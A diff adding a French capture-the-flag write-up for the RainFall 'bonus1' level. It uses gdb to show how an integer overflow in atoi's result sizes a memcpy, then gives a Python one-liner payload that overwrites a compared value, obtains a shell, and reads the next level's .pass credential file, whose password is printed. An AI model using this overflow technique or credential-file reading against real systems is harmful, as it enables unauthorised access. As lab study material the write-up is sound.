@@ -1,0 +1,51 @@
+Alors apres decomposition et lecture de l'assembleur, pour faire marcher l'exploit, il faudra:
+- surcharger le retour d'atoi pour qu'une fois multiplier par 4 il devienne superieur ou egal a 44.
+- utiliser memcpy pour ecrire 40 caracteres + 0x574f4c46.
+
+On va checker avec gdb la valeur de %ecx car il contient le retour d'atoi *4, pour cela:
+- on met un breakpoint a memcpy.
+- on run le programme avec la valeur MIN d'un int.
+- on print la valeur d'ecx.
+- on augmente la valeur MIN jusqu'a ce que %ecx soit >= 44.
+
+bonus1@RainFall:~$ gdb ./bonus1
+(gdb) disas main
+Dump of assembler code for function main:
+...
+   0x08048470 <+76>:   mov    %eax,(%esp)
+   0x08048473 <+79>:   call   0x8048320 <memcpy@plt>             <-------- breakpoint !!!!!!
+   0x08048478 <+84>:   cmpl   $0x574f4c46,0x3c(%esp)
+...
+(gdb) b *0x08048478
+Breakpoint 1 at 0x8048478
+(gdb) r -2147483647 toto
+(gdb) p $ecx
+$1 = 4
+(gdb) r -2147483646 toto
+(gdb) p $ecx
+$2 = 8
+(gdb) r -2147483645 toto
+(gdb) p $ecx
+$3 = 12
+
+On en deduit que %ecx augmente de 4 a chaque reduction de MIN(int).
+(gdb) r -2147483607 toto
+(gdb) p $ecx
+$4 = 164
+
+A ce moment la, nous en deduisons que memcpy ressemblera a ca:
+
+memcpy(buf, av[2], 164);
+
+Du coup, si on ecrit:
+
+bonus1@RainFall:~$ ./bonus1 `python -c 'print "-2147483607 " + "A"*40 + "\x57\x4f\x4c\x46"[::-1]'`
+$ ls
+ls: cannot open directory .: Permission denied
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+
+
+
+doomed...
